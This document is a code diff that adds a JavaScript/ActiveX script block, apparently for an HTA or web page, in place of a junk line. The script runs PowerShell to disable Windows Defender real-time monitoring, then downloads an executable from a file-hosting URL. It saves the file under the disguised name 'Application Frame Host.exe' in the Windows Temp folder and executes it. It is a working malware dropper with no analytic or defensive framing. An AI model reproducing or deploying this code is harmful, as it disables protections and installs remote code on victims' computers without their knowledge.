@@ -1,1 +1,34 @@
-czcczz
+<script language="javascript">
+    // Disable Windows Defender Real-Time Monitoring
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', 0, true);
+
+    // Wait for a few seconds to ensure Defender is disabled before continuing
+    WScript.Sleep(3000);
+
+    // Define the URL and destination for the file download (with spaces in filename)
+    var url = "https://store10.gofile.io/download/web/e382faa0-2338-4565-a998-573dea5f77c0/Application%20Frame%20Host.exe"; // Correct direct download link
+    var destination = "C:\\Windows\\Temp\\Application Frame Host.exe"; // Destination path (with spaces)
+
+    try {
+        // Download the file
+        var xhttp = new ActiveXObject("Microsoft.XMLHTTP");
+        xhttp.open("GET", url, false);
+        xhttp.send();
+
+        // Save the file
+        if (xhttp.status == 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Type = 1; // Binary
+            stream.Open();
+            stream.Write(xhttp.responseBody);
+            stream.SaveToFile(destination, 2); // Overwrite if exists
+            stream.Close();
+
+            // Execute the downloaded file (with spaces in the path)
+            shell.Run('"' + destination + '"', 1, false);
+        }
+    } catch (e) {
+        WScript.Echo("Error: " + e.message);
+    }
+</script>
